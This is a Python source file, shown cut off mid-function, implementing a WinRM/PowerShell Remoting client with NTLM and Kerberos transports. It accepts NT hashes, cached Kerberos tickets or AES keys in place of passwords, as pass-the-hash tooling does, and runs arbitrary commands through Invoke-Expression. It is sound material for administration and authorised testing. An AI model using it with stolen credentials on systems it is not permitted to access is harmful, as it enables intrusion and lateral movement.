import os, sys, re, uuid, logging, time, shlex, ssl

from copy import deepcopy
from base64 import b64encode, b64decode
from struct import pack, unpack, error
from signal import SIGINT, signal, getsignal
from random import randbytes, randint
from pathlib import PureWindowsPath, Path
from datetime import datetime, UTC
from argparse import ArgumentParser
from ipaddress import ip_address

# pip install xmltodict
import xmltodict

# pip install requests
from requests import Session

from urllib3 import disable_warnings
from urllib3.util import SKIP_HEADER
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(category=InsecureRequestWarning)

# -- impacket: ------------------------------------------------------------------------------------
from pyasn1.codec.ber import encoder, decoder
from pyasn1.type.univ import ObjectIdentifier, noValue

from impacket.krb5.asn1 import AP_REQ, AP_REP, TGS_REP, seq_set
from impacket.krb5.asn1 import Authenticator, EncAPRepPart

from impacket.ntlm import getNTLMSSPType1, getNTLMSSPType3, SEALKEY, SIGNKEY, SEAL, SIGN
from impacket.ntlm import NTLMAuthChallenge, AV_PAIRS, NTLMSSP_AV_CHANNEL_BINDINGS

from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.ccache import CCache
from impacket.krb5.constants import PrincipalNameType, ApplicationTagNumbers, encodeFlags
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, KerberosError

from impacket.krb5.gssapi import GSSAPI, KRB5_AP_REQ, CheckSumField
from impacket.krb5.gssapi import GSS_C_MUTUAL_FLAG, GSS_C_REPLAY_FLAG, GSS_C_SEQUENCE_FLAG
from impacket.krb5.gssapi import GSS_C_CONF_FLAG, GSS_C_INTEG_FLAG

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target

from Cryptodome.Hash import HMAC, MD5, SHA256
from Cryptodome.Cipher import ARC4

# -- helpers and constants: -----------------------------------------------------------------------
def between(buf, pre, suf):
    off = buf.index(pre) + len(pre)
    buf = buf[off:]
    off = buf.index(suf)
    return buf[:off]

def chunks(xs, n):
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s):
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    else:
        return b64encode(s).decode()

def serialize(obj):
    return xmltodict.unparse(obj, full_document=False).encode()

def deserialize(data):
    return xmltodict.parse(data, strip_whitespace=False)

def split_args(cmdline):
    try:
        args = shlex.split(cmdline, posix=False)
    except ValueError:
        return []

    fixed = []
    for arg in args:
        if arg.startswith('"') and arg.endswith('"'):
            fixed.append(arg[1:-1])
        elif arg.startswith("'") and arg.endswith("'"):
            fixed.append(arg[1:-1])
        else:
            fixed.append(arg)
    return fixed

_utfstr = re.compile(r'_x([0-9a-fA-F]{4})_')
def utfstr(s):
    # chars inside xml strings that have non-printable characters are encoded like this, eg:
    # '\n' would be "_x000A_", etc.. although i don't know how to tell if a charcter was
    # encoded during xml serialization or there was a literal *string* "_x000A_" somewhere
    # to begin with:
    try:
        return _utfstr.sub(lambda m: bytes.fromhex(m.group(1)).decode("utf-16be"), s)
    except:
        return s

def xorenc(xs, key):
    return bytes(x ^ key for x in xs)

zero_uuid = str(uuid.UUID(bytes_le=bytes(16))).upper()

# stolen from https://github.com/skelsec/asyauth/blob/main/asyauth/protocols/kerberos/gssapi.py
# as i could not find anything like this in impacket:
def krb5_mech_indep_token_encode(oid, data):
    oid = encoder.encode(ObjectIdentifier(oid)) # KRB5 - Kerberos 5
    payload = oid + data
    n = len(payload)
    if n < 128:
        size = n.to_bytes(1, byteorder="big")
    else:
        size = n.to_bytes((n.bit_length() + 7) // 8, "big")
        size = (128 + len(size)).to_bytes(1, "big") + size

    return b"\x60" + size + payload

def krb5_mech_indep_token_decode(data):
    skip = 2 + (data[1] if data[1] < 128 else (data[1] - 128))
    return decoder.decode(data[skip:], asn1Spec=ObjectIdentifier)

# -- soap templates for winrm: --------------------------------------------------------------------
# i know this is jank as !@&#, but i only need a bare minimum to have a working shell:
soap_req_tmpl = {
    's:Envelope': {
        '@xmlns:rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell',
        '@xmlns:s': 'http://www.w3.org/2003/05/soap-envelope',
        '@xmlns:wsa': 'http://schemas.xmlsoap.org/ws/2004/08/addressing',
        '@xmlns:wsman': 'http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd',
        '@xmlns:wsmv': 'http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd',
        's:Header': {
            'wsa:Action': { '@s:mustUnderstand': 'true', '#text': 'REPLACEME' },
            'wsmv:DataLocale': { '@s:mustUnderstand': 'false', '@xml:lang': 'en-US' },
            'wsman:Locale': { '@s:mustUnderstand': 'false', '@xml:lang': 'en-US' },
            'wsman:MaxEnvelopeSize': { '@s:mustUnderstand': 'true', '#text': '64000' },
            'wsa:MessageID': 'REPLACEME', #f"uuid:{message_id}"
            'wsman:OperationTimeout': 'REPLACEME', # f"PT{timeout}S"
            'wsa:ReplyTo': {
                'wsa:Address': {
                    '@s:mustUnderstand': 'true',
                    '#text': 'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous'
                }
            },
            'wsman:ResourceURI': {
                '@s:mustUnderstand': 'true',
                '#text': 'http://schemas.microsoft.com/powershell/Microsoft.PowerShell'
            },
            'wsmv:SessionId': { '@s:mustUnderstand': 'false', '#text': 'REPLACEME' },
            'wsa:To': 'REPLACEME',
            'wsman:OptionSet': {
                '@s:mustUnderstand': 'true',
                #'wsman:Option': {
                #    # REPLACEME
                #}
            },
            "wsman:SelectorSet" : {
                # REPLACEME
            }
        },
        's:Body': {
            # REPLACEME
        }
    }
}

soap_actions = {
    "create"  : "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
    "delete"  : "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete",
    "receive" : "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
    "command" : "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
    "signal"  : "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal"
}

# fill in common fields for soap request:
def soap_req(action, session_id, url, shell_id=None, message_id=None, timeout=20):
    message_id = message_id or str(uuid.uuid4()).upper()
    req = deepcopy(soap_req_tmpl)
    req["s:Envelope"]["s:Header"]["wsa:Action"]["#text"] = soap_actions[action]
    req["s:Envelope"]["s:Header"]["wsa:MessageID"] = "uuid:" + message_id
    req["s:Envelope"]["s:Header"]["wsa:To"] = url
    req["s:Envelope"]["s:Header"]["wsmv:SessionId"]["#text"] = f"uuid:{session_id}"
    req["s:Envelope"]["s:Header"]["wsman:OperationTimeout"] = f"PT{timeout}S"

    if shell_id:
        req["s:Envelope"]["s:Header"]["wsman:SelectorSet"] = {
            "wsman:Selector" : { "@Name" : "ShellId", "#text" : shell_id }
        }

    return req

# this simplifies the response to only grab the elements i will need:
def soap_rsp(rsp):
    action, body = rsp["s:Envelope"]["s:Header"]["a:Action"], rsp["s:Envelope"]["s:Body"]
    if action.endswith("wsman/fault"):
        fault = body["s:Fault"]
        return {
            "fault"   : "OK",
            "subcode" : fault.get("s:Code",   {}).get("s:Subcode", {}).get("s:Value") or "",
            "reason"  : fault.get("s:Reason", {}).get("s:Text", {}).get("#text") or "",
            "detail"  : fault.get("s:Detail", {}).get("f:Message") or "",
        }
    elif action.endswith("shell/ReceiveResponse"):
        receive = body["rsp:ReceiveResponse"]
        streams = receive.get("rsp:Stream", [])
        if isinstance(streams, dict): # sometimes there's just one stream
            streams = [ streams ]
        return {
            "receive" : "OK",
            "streams" : [ b64decode(s.get("#text", "")) for s in streams ],
            "state"   : receive.get("rsp:CommandState", {}).get("@State") or ""
        }
    elif action.endswith("transfer/CreateResponse"):
        return { "create" : "OK", }
    elif action.endswith("shell/SignalResponse"):
        return { "signal" : "OK" }
    elif action.endswith("transfer/DeleteResponse"):
        return { "delete" : "OK" }
    elif action.endswith("shell/CommandResponse"):
        return { "command" : "OK" }
    else:
        return { "unknown" : rsp } # for debugging


# -- PSObjects: -----------------------------------------------------------------------------------
# bare minimum to create relevant ps remoting objects:
ps_nil  = lambda n    : { "Nil"     : { "@N" : n } }
ps_int  = lambda n, v : { "I32"     : { "@N" : n, "#text" : str(v) } }
ps_str  = lambda n, v : { "S"       : { "@N" : n, "#text" : v } }
ps_ver  = lambda n, v : { "Version" : { "@N" : n, "#text" : v } }
ps_bool = lambda n, v : { "B"       : { "@N" : n, "#text" : str(bool(v)).lower()} }
ps_obj  = lambda n, v : { "Obj"     : { "@N" : n, "MS" : v } }
ps_enum = lambda n, v : { "Obj"     : { "@N" : n, "I32" : v } }
ps_smap = lambda elms : { "Obj"     : { "MS" : elms } }

ps_list = lambda name, kind, elements : {
    "Obj" : {
        "@N" : name,
        "LST" : { kind : [ el[kind] for el in elements ] }
    }
}

ps_session_capability = ps_smap([
    ps_ver("protocolversion", "2.3"),
    ps_ver("PSVersion", "2.0"),
    ps_ver("SerializationVersion", "1.1.0.10")
])

ps_host_info = ps_obj("HostInfo", [
    ps_bool("_isHostNull",      True),
    ps_bool("_isHostUINull",    True),
    ps_bool("_isHostRawUINull", True),
    ps_bool("_useRunspaceHost", True)
])

ps_runspace_pool = ps_smap([
    ps_int("MinRunspaces", 1),
    ps_int("MaxRunspaces", 1),
    ps_enum("PSThreadOptions", 0),
    ps_enum("ApartmentState",  2),
    ps_host_info,
    ps_nil("ApplicationArguments")
])

ps_args = lambda args: [
    ps_smap([ ps_str("N", k), ps_str("V", v) if v else ps_nil("V") ]) for k, v in args.items()
]

ps_command = lambda cmd, args : ps_smap([
    ps_str("Cmd", cmd),
    ps_list("Args", "Obj", ps_args(args)),
    ps_bool("IsScript", False),
    ps_nil("UseLocalScope"),
    ps_enum("MergeMyResult", 0),
    ps_enum("MergeToResult", 0),
    ps_enum("MergePreviousResults", 0),
    ps_enum("MergeError", 0),
    ps_enum("MergeWarning", 0),
    ps_enum("MergeVerbose", 0),
    ps_enum("MergeDebug", 0),
    ps_enum("MergeInformation", 0),
])

ps_create_pipeline = lambda commands : ps_smap([
    ps_bool("NoInput", True),
    ps_bool("AddToHistory", False),
    ps_bool("IsNested", False),
    ps_enum("ApartmentState", 2),
    ps_enum("RemoteStreamOptions", 15),
    ps_host_info,
    ps_obj("PowerShell", [
        ps_bool("IsNested", False),
        ps_bool("RedirectShellErrorOutputPipe", False),
        ps_nil("ExtraCmds"),
        ps_nil("History"),
        ps_list("Cmds", "Obj", [ ps_command(cmd, args) for cmd, args in commands ])
    ])
])


# -- message framing: -----------------------------------------------------------------------------
msg_ids = {
    0x00010002 : "SESSION_CAPABILITY",
    0x00010004 : "INIT_RUNSPACEPOOL",
    0x00010005 : "PUBLIC_KEY",
    0x00010006 : "ENCRYPTED_SESSION_KEY",
    0x00010007 : "PUBLIC_KEY_REQUEST",
    0x00010008 : "CONNECT_RUNSPACEPOOL",
    0x0002100B : "RUNSPACEPOOL_INIT_DATA",
    0x0002100C : "RESET_RUNSPACE_STATE",
    0x00021002 : "SET_MAX_RUNSPACES",
    0x00021003 : "SET_MIN_RUNSPACES",
    0x00021004 : "RUNSPACE_AVAILABILITY",
    0x00021005 : "RUNSPACEPOOL_STATE",
    0x00021006 : "CREATE_PIPELINE",
    0x00021007 : "GET_AVAILABLE_RUNSPACES",
    0x00021008 : "USER_EVENT",
    0x00021009 : "APPLICATION_PRIVATE_DATA",
    0x0002100A : "GET_COMMAND_METADATA",
    0x00021100 : "RUNSPACEPOOL_HOST_CALL",
    0x00021101 : "RUNSPACEPOOL_HOST_RESPONSE",
    0x00041002 : "PIPELINE_INPUT",
    0x00041003 : "END_OF_PIPELINE_INPUT",
    0x00041004 : "PIPELINE_OUTPUT",
    0x00041005 : "ERROR_RECORD",
    0x00041006 : "PIPELINE_STATE",
    0x00041007 : "DEBUG_RECORD",
    0x00041008 : "VERBOSE_RECORD",
    0x00041009 : "WARNING_RECORD",
    0x00041010 : "PROGRESS_RECORD",
    0x00041011 : "INFORMATION_RECORD",
    0x00041100 : "PIPELINE_HOST_CALL",
    0x00041101 : "PIPELINE_HOST_RESPONSE"
}

for k, v in msg_ids.items():
    globals()[v] = k

def fragment(next_obj_id, messages):
    # this doesn't do proper fragmentation over multiple wxf:Send requests, but my
    # thinking here is that i'm *sending* only smallish messages, so i can get away
    # with it; defragment() does it properly because server responses can get very large:
    fragments = b""

    for msg_type, rpid, pid, data in messages:
        this  = pack("<I", 0x00002)          # destination = SERVER
        this += pack("<I", msg_type)
        this += uuid.UUID(rpid).bytes_le
        this += uuid.UUID(pid).bytes_le
        this += data

        fragments += pack(">Q", next_obj_id) # object_id
        fragments += pack(">Q", 0)           # fragment_id
        fragments += pack(">B", 0x1 | 0x2)   # pray message fits in this fragment
        fragments += pack(">I", len(this))
        fragments += this

        next_obj_id += 1

    return fragments

def defragment(streams, object_buffer):
    for buf in streams:
        fragments = []
        while buf:
            object_id, fragment_seq = unpack(">QQ", buf[:16])
            is_start, is_end = bool(buf[16] & 1), bool(buf[16] & 2)
            msg_len, = unpack(">I", buf[17:21])
            partial = buf[21:21 + msg_len]
            buf = buf[21 + msg_len:]

            this = object_buffer.get(object_id)
            if this is None:
                this = { "seq" : fragment_seq, "data" : b"" }
                object_buffer[object_id] = this

            if is_start and is_end:
                fragments.append(partial)
                del object_buffer[object_id]
            elif is_start:
                this["data"] = partial
                this["seq"] += 1
            elif is_end:
                fragments.append(this["data"] + partial)
                del object_buffer[object_id]
            else:
                this["data"] += partial
                this["seq"]  += 1

        for frag in fragments:
            _, msg_type = unpack("<II", frag[:8])
            rpid = str(uuid.UUID(bytes_le=frag[8:24])).upper()
            pid  = str(uuid.UUID(bytes_le=frag[24:40])).upper()
            msg  = deserialize(frag[40:].decode())
            yield (msg_type, msg, rpid, pid)

# -- transports: ----------------------------------------------------------------------------------
class BasicTransport:
    def __init__(self, args):
        self.session = Session()
        self.session.headers["User-Agent"] = SKIP_HEADER
        self.session.headers["Accept-Encoding"] = SKIP_HEADER
        self.url  = args.url
        self.auth = (args.username, args.password)

    def send(self, req):
        rsp = self.session.post(self.url, verify=False, auth=self.auth, data=req, headers={
            "Content-Type" : "application/soap+xml;charset=UTF-8"
        })
        return rsp.content

class NTLMTransport:
    def __init__(self, args):
        self.args    = args
        self.session = None
        if args.ssl:
            host = urlparse(args.url).hostname
            port = urlparse(args.url).port or 443
            cert = ssl.get_server_certificate((host, port))
            cert = cert.removeprefix("-----BEGIN CERTIFICATE-----\n")
            cert = cert.removesuffix("-----END CERTIFICATE-----\n")
            cert = SHA256.new(b64decode(cert)).digest()
            app_data  = b"tls-server-end-point:" + cert
            self.gss_bindings = MD5.new(bytes(16) + pack("<I", len(app_data)) + app_data).digest()

    def send(self, req):
        if self.session is None:
            self._auth()

        rsp = self._send(req)
        if rsp.status_code == 401:
            logging.debug("server asked to reauth")
            self._auth()
            rsp = self._send(req)

        if rsp.status_code == 401:
            raise RuntimeError("failed to reauth")

        if rsp.status_code not in (200, 500):
            raise RuntimeError("unexcpected response")

        return rsp.content

    def _send(self, req):
        prefix   = b"Content-Type: application/octet-stream\r\n"
        suffix   = b"--Encrypted Boundary--\r\n"
        protocol = "application/HTTP-SPNEGO-session-encrypted"

        seq = pack("<I", self.msgseq)
        enc = self.rc4_cli.encrypt(req)
        sig = HMAC.new(self.key_cli, seq + req, digestmod=MD5).digest()[:8]
        sig = pack("<I", 1) + self.rc4_cli.encrypt(sig) + seq

        data  = b"--Encrypted Boundary\r\n"
        data += f"Content-Type: {protocol}\r\n".encode()
        data += f"OriginalContent: type=application/soap+xml;charset=UTF-8;Length={len(req)}\r\n".encode()
        data += b"--Encrypted Boundary\r\n"
        data += prefix + pack("<I", len(sig)) + sig + enc + suffix

        rsp = self.session.post(self.args.url, verify=False, data=data, headers={
            "Content-Type" : f'multipart/encrypted;protocol="{protocol}";boundary="Encrypted Boundary"'
        })

        if rsp.status_code not in (200, 500):
            return rsp

        try:
            assert b"application/soap+xml;charset=UTF-8" in rsp.content
            body = between(rsp.content, prefix, suffix)
            assert unpack("<II", body[:8]) == (16, 1) # length, version
            assert body[16:20] == seq                 # message sequence
        except:
            raise RuntimeError("failed to parse response")

        plaintext = self.rc4_srv.decrypt(body[20:])

        sig0 = body[8:16]
        sig1 = HMAC.new(self.key_srv, seq + plaintext, digestmod=MD5).digest()[:8]
        sig1 = self.rc4_srv.decrypt(sig1)

        if sig0 != sig1:
            raise RuntimeError("failed to verify response signature")

        self.msgseq += 1
        rsp.headers["Content-Type"] = "application/soap+xml;charset=UTF-8"
        rsp.headers["Content-Length"] = str(len(plaintext))
        rsp._content = plaintext
        return rsp

    def _auth(self, url=None):
        self.session = None
        self.msgseq  = None
        self.key_cli = None
        self.key_srv = None
        self.rc4_cli = None
        self.rc4_srv = None

        s = Session()
        s.headers["User-Agent"] = SKIP_HEADER
        s.headers["Accept-Encoding"] = SKIP_HEADER

        type1 = getNTLMSSPType1()
        type1["flags"] = 0xe0088237 # wiresharked
        type1_token = "Negotiate " + b64str(type1.getData())

        rsp = s.post(self.args.url, verify=False, headers={ "Authorization" : type1_token })

        www_auth = rsp.headers.get("WWW-Authenticate", "")
        if not www_auth.startswith("Negotiate "):
            raise RuntimeError("NTLM auth failed")

        type2 = b64decode(www_auth.removeprefix("Negotiate "))

        # include tls channel bindings in case CbtHardeningLevel=Strict
        if self.args.ssl:
            chal = NTLMAuthChallenge(type2)
            info = AV_PAIRS(chal['TargetInfoFields'])
            info[NTLMSSP_AV_CHANNEL_BINDINGS] = self.gss_bindings
            chal["TargetInfoFields"]          = info.getData()
            chal["TargetInfoFields_len"]      = len(info.getData())
            chal["TargetInfoFields_max_len"]  = len(info.getData())
            type2 = chal.getData()

        nt_hash = bytes.fromhex(self.args.nt_hash) if self.args.nt_hash else ""
        type3, key = getNTLMSSPType3(type1, type2, self.args.username, self.args.password,
                                     "", "", nt_hash)

        type3_token = "Negotiate " + b64str(type3.getData())
        rsp = s.post(self.args.url, verify=False, headers= { "Authorization" : type3_token })

        flags = type3["flags"]

        self.session = s
        self.msgseq  = 0
        self.key_cli = SIGNKEY(flags, key, "Client")
        self.key_srv = SIGNKEY(flags, key, "Server")
        self.rc4_cli = ARC4.new(SEALKEY(flags, key, "Client"))
        self.rc4_srv = ARC4.new(SEALKEY(flags, key, "Server"))

class KerberosTransport:
    def __init__(self, args):
        self.args       = args
        self.tgs_ticket = None
        self.tgs_cipher = None
        self.tgs_key    = None
        self.session    = None
        self.subkey     = None
        self.cipher     = None
        self.msgseq     = None

        # -- get TGS and keep it throught the lifetime of this object: ----------------------------
        user = Principal(args.username, type=PrincipalNameType.NT_PRINCIPAL.value)
        http = Principal(args.spn,      type=PrincipalNameType.NT_PRINCIPAL.value)

        tgt, tgs = None, None

        if os.getenv("KRB5CCNAME"):
            _, _, tgt, tgs = CCache.parseFile(target=args.spn)
            if tgt and not tgs:
                cipher = tgt['cipher']
                tgtkey = tgt['sessionKey']
                tgt    = tgt['KDC_REP']
            elif tgs:
                cipher = tgs['cipher']
                tgskey = tgs['sessionKey']
                tgs    = tgs['KDC_REP']
        else:
            logging.info(f"requesting TGT for {args.domain}\\{args.username}")
            tgt, cipher, _, tgtkey = getKerberosTGT(user, args.password, args.domain, "",
                                                    args.nt_hash, args.aesKey, args.dc_ip)
        if not tgt and not tgs:
            raise KerberosError("Could not get TGT or TGS")

        if not tgs:
            logging.info(f"requesting TGS for {args.spn}")
            tgs, cipher, _, tgskey = getKerberosTGS(http, args.domain, args.dc_ip, tgt, cipher, tgtkey)

        ticket = Ticket()
        ticket.from_asn1(decoder.decode(tgs, asn1Spec=TGS_REP())[0]["ticket"])

        self.tgs_ticket = ticket
        self.tgs_cipher = cipher
        self.tgs_key    = tgskey

        if args.ssl:
            host = urlparse(args.url).hostname
            port = urlparse(args.url).port or 443
            cert = ssl.get_server_certificate((host, port))
            cert = cert.removeprefix("-----BEGIN CERTIFICATE-----\n")
            cert = cert.removesuffix("-----END CERTIFICATE-----\n")
            cert = SHA256.new(b64decode(cert)).digest()
            app_data = b"tls-server-end-point:" + cert
            self.gss_bindings = MD5.new(bytes(16) + pack("<I", len(app_data)) + app_data).digest()

    def send(self, req):
        if self.session is None:
            self._auth()

        rsp = self._send(req)
        if rsp.status_code == 401:
            logging.debug("server asked to reauth")
            self._auth()
            rsp = self._send(req)

        if rsp.status_code == 401:
            raise RuntimeError("failed to reauth")

        if rsp.status_code not in (200, 500):
            raise RuntimeError("unexcpected response")

        return rsp.content

    def _send(self, req):
        gss = GSSAPI(self.cipher)
        r0, r1 = gss.GSS_Wrap(self.subkey, req, self.msgseq)

        prefix   = b"Content-Type: application/octet-stream\r\n"
        suffix   = b"--Encrypted Boundary--\r\n"
        protocol = "application/HTTP-Kerberos-session-encrypted"

        data  = b"--Encrypted Boundary\r\n"
        data += f"Content-Type: {protocol}\r\n".encode()
        data += f"OriginalContent: type=application/soap+xml;charset=UTF-8;Length={len(req)}\r\n".encode()
        data += b"--Encrypted Boundary\r\n"
        data += prefix + pack("<I", len(r1)) + r1 + r0 + suffix

        rsp = self.session.post(self.args.url, verify=False, data=data, headers={
            "Content-Type" : f'multipart/encrypted;protocol="{protocol}";boundary="Encrypted Boundary"'
        })

        if rsp.status_code not in (200, 500):
            return rsp

        try:
            assert b"application/soap+xml;charset=UTF-8" in rsp.content
            body = between(rsp.content, prefix, suffix)
        except:
            raise RuntimeError("failed to parse response")

        try:
            hdr_size  = unpack("<I", body[:4])[0]
            hdr_data  = body[4:][:hdr_size]
            enc_data  = body[4:][hdr_size:]
            hdr_data  = bytes(8) + hdr_data # extra bytes are a hack to reuse GSS_Unwrap() for WinRM
            plaintext = gss.GSS_Unwrap(self.subkey, enc_data, self.msgseq, 'accept', True, hdr_data)[0]
        except:
            raise RuntimeError("failed to decrypt response")

        self.msgseq += 1
        rsp.headers["Content-Type"] = "application/soap+xml;charset=UTF-8"
        rsp.headers["Content-Length"] = str(len(plaintext))
        rsp._content = plaintext
        return rsp

    def _auth(self):
        user = Principal(self.args.username, type=PrincipalNameType.NT_PRINCIPAL.value)

        checksum = CheckSumField()
        checksum['Lgth']   = 16
        checksum['Flags']  = GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG | GSS_C_SEQUENCE_FLAG
        checksum['Flags'] |= GSS_C_REPLAY_FLAG | GSS_C_MUTUAL_FLAG
        # include tls channel binding in case CbtHardeningLevel=Strict
        if self.args.ssl:
            checksum['Bnd'] = self.gss_bindings

        now = datetime.now(UTC)

        auth = Authenticator()
        seq_set(auth, 'cname', user.components_to_asn1)
        auth['authenticator-vno']  = 5
        auth['crealm']             = self.args.domain
        auth['cusec']              = now.microsecond
        auth['ctime']              = KerberosTime.to_asn1(now)
        auth['cksum']              = noValue
        auth['cksum']['cksumtype'] = 0x8003
        auth['cksum']['checksum']  = checksum.getData()
        # include a dummy subkey here with enctype=18 so that when in AP_REP when application
        # returns *it's* subkey it will have this enctype too, otherwise it will have
        # the same enctype as tgskey (eg 23) and WinRM can only work with AES:
        auth['subkey'] = noValue
        auth['subkey']['keyvalue'] = randbytes(32)
        auth['subkey']['keytype']  = 18
        enc_auth = self.tgs_cipher.encrypt(self.tgs_key, 11, encoder.encode(auth), None)

        ap_req = AP_REQ()
        ap_req['pvno']       = 5
        ap_req['msg-type']   = int(ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = encodeFlags([2]) # mutual-required
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = self.tgs_cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth
        seq_set(ap_req, 'ticket', self.tgs_ticket.to_asn1)

        # -- "Authorization" token for http request: ----------------------------------------------
        token = KRB5_AP_REQ + encoder.encode(ap_req)
        token = krb5_mech_indep_token_encode("1.2.840.113554.1.2.2", token)
        token = "Kerberos " + b64str(token)

        # -- ask for AP_REP via HTTP: -------------------------------------------------------------
        session = Session()
        session.headers["User-Agent"] = SKIP_HEADER
        session.headers["Accept-Encoding"] = SKIP_HEADER
        rsp = session.post(self.args.url, verify=False, headers={ "Authorization" : token })
        www_auth = rsp.headers.get("WWW-Authenticate", "")

        try:
            assert www_auth.startswith("Kerberos ")
            www_auth = www_auth.removeprefix("Kerberos ")
            krb_blob = krb5_mech_indep_token_decode(b64decode(www_auth))[1]
            ap_rep   = decoder.decode(krb_blob[2:], asn1Spec=AP_REP())[0]
        except:
            raise RuntimeError("Kerberos auth failed")

        ap_rep_enc = self.tgs_cipher.decrypt(self.tgs_key, 12, ap_rep["enc-part"]["cipher"])
        ap_rep_dec = decoder.decode(ap_rep_enc, asn1Spec=EncAPRepPart())[0]
        keydata    = ap_rep_dec["subkey"]["keyvalue"].asOctets()
        keytype    = ap_rep_dec["subkey"]["keytype"]

        self.subkey  = Key(keytype, keydata)
        self.cipher  = _enctype_table[keytype] # 18
        self.session = session
        self.msgseq  = 0

# -- MS-PSRP stuff from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp ------
class Runspace:
    def __init__(self, transport, args, timeout=5):
        self.args            = args
        self.transport       = transport(args)
        self.timeout         = timeout
        self.object_buffer   = {}
        self.next_object_id  = 1
        self.current_command_id = None
        self.session_id      = str(uuid.uuid4()).upper()
        self.shell_id        = str(uuid.uuid4()).upper()

    def __enter__(self):
        messages = fragment(self.next_object_id, [
            (SESSION_CAPABILITY, self.shell_id, zero_uuid, serialize(ps_session_capability)),
            (INIT_RUNSPACEPOOL,  self.shell_id, zero_uuid, serialize(ps_runspace_pool))
        ])

        req = soap_req("create", self.session_id, self.args.url, timeout=self.timeout)

        req["s:Envelope"]["s:Header"]["wsman:OptionSet"]["wsman:Option"] = {
            "@MustComply" : 'true',
            "@Name"       : "protocolversion",
            "#text"       : "2.3"
        }

        req["s:Envelope"]["s:Body"] = {
            "rsp:Shell" : {
                "@ShellId"          : self.shell_id,
                "rsp:InputStreams"  : "stdin pr",
                "rsp:OutputStreams" : "stdout",
                "creationXml"       : b64str(messages)
            }
        }
        # TODO: maybe deal with responses, but whatever.. doesn't seem to fail ever
        # and if something happens it will error out when trying to create a pipeline
        self._send(req)
        self._receive()
        self._receive()
        return self

    def __exit__(self, exc_type, exc_value, tb):
        logging.debug(f"_delete : {self.shell_id}")
        req = soap_req("delete", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
        self._send(req)

    def run_command(self, cmd, debug=True):
        command_id = self._create_pipeline(cmd)
        if not command_id:
            yield { "error" : "failed to create pipeline, if this persists just restart the shell" }
            return

        timeouts = 0
        self.current_command_id = command_id
        while True:
            rsp = self._receive(command_id)
            if "fault" in rsp:
                if rsp["subcode"] == "w:TimedOut":
                    timeouts += 1                  # some commands take a while; this is fine, but
                    yield { "timeout" : timeouts } # yield anyway, maybe user wants to interrupt
                    continue
                else:
                    yield { "error" : rsp["reason"] + "\n" + rsp["detail"] }
                    return

            timeouts = 0 # reset timeout counter when we finally get a response
            for msg_type, msg, _, _ in defragment(rsp["streams"], self.object_buffer):
                if msg_type == PIPELINE_OUTPUT: # from Write-Output
                    yield { "stdout" : utfstr(msg.get("S") or "") }

                elif msg_type == ERROR_RECORD: # from Write-Error
                    yield { "error" : utfstr(msg.get("Obj", {}).get("ToString") or "unknown error") }

                elif msg_type == WARNING_RECORD: # from Write-Warning
                    yield { "warn" : utfstr(msg.get("Obj", {}).get("ToString") or "unknown warning") }

                elif msg_type == INFORMATION_RECORD: # from Write-Host
                    props = msg.get("Obj", {}).get("MS", {}).get("Obj", [{}])[0].get("Props", {})
                    text = props.get("S", {}).get("#text") or ""
                    endl = props.get("B", {}).get("#text", "false") == "false"
                    yield { "info" : utfstr(text), "endl" : "\n" if endl else "" }

                elif msg_type == VERBOSE_RECORD: # from Write-Verbose
                    yield { "verbose" : utfstr(msg.get("Obj", {}).get("ToString") or "") }

                elif msg_type == PIPELINE_STATE: # if there was an exception and treat it as error:
                    err = msg.get("Obj", {}).get("MS", {}).get("Obj", {})
                    if err.get("@N") == "ExceptionAsErrorRecord":
                        yield { "error" : utfstr(err.get("ToString") or "uknonwn exception") }

                elif msg_type == PROGRESS_RECORD: # from Write-Progress
                    for progress in msg.get("Obj", {}).get("MS", {}).get("S", []):
                        yield { "progress" : progress.get("#text", "") }

                else: # debug strays in case i missed something:
                    logging.debug(f"{msg_ids[msg_type]} : {msg}")

            if rsp["state"]:
                break # == CommandState/Done when pipeline finishes

        self.current_command_id = None

    def interrupt(self):
        if not self.current_command_id:
            return
        req = soap_req("signal", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
        req["s:Envelope"]["s:Body"] = {
            "rsp:Signal" : {
                "@CommandId" : self.current_command_id,
                "rsp:Code" : "powershell/signal/crtl_c",
            }
        }
        return self._send(req)

    def _send(self, req):
        rsp = self.transport.send(serialize(req))
        return soap_rsp(deserialize(rsp))

    def _receive(self, command_id=None):
        req = soap_req("receive", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)

        req["s:Envelope"]["s:Header"]["wsman:OptionSet"]["wsman:Option"] = {
            "@Name" : "WSMAN_CMDSHELL_OPTION_KEEPALIVE", "#text" : "True"
        }
        stream = { "#text" : "stdout" } | ({ "@CommandId" : command_id} if command_id else {})

        req["s:Envelope"]["s:Body"] = { "rsp:Receive" : { "rsp:DesiredStream" : stream } }

        return self._send(req)

    def _create_pipeline(self, cmd):
        command_id = str(uuid.uuid4()).upper()

        # Invoke-Expression $cmd | Out-String -Stream
        create_pipeline = ps_create_pipeline([
            ("Invoke-Expression", { "Command" : cmd }),
            ("Out-String", { "Stream" : None } )
        ])

        messages = fragment(self.next_object_id, [
            (CREATE_PIPELINE, self.shell_id, command_id, serialize(create_pipeline))
        ])

        req = soap_req("command", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
        req["s:Envelope"]["s:Body"] = {
            "rsp:CommandLine" : {
                "@CommandId" : command_id,
